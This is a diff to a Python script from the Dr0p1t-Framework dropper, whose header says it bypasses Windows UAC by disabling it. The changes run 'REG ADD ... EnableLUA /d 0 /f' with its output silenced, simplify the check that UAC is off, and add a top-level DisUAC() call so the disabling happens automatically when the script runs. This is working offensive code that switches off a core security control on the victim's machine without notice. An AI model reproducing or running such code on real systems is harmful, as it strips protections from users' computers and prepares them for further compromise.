@@ -1,4 +1,3 @@
-#((Todo list))
 #Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
 #This script aims to bypass UAC by trying to disable the UAC (¯\_(ツ)_/¯)
 '''
@@ -28,12 +27,11 @@ def get_ready():
 
 def DisUAC():
 	def disable_uac():
-		x=subprocess.Popen("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+		x=subprocess.Popen("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >> NUL",shell=True)
 #####
 	def check_uac():
-		uac_check = subprocess.Popen("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-		uac = uac_check.stdout.read()+uac_check.stderr.read()
-		if "0x1" in uac.decode():
+		uac = get_output("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA")
+		if "0x1" in uac:
 			return True
 		else:
 			return False
@@ -46,3 +44,5 @@ def DisUAC():
 			return True
 	else:
 		return True
+
+DisUAC()
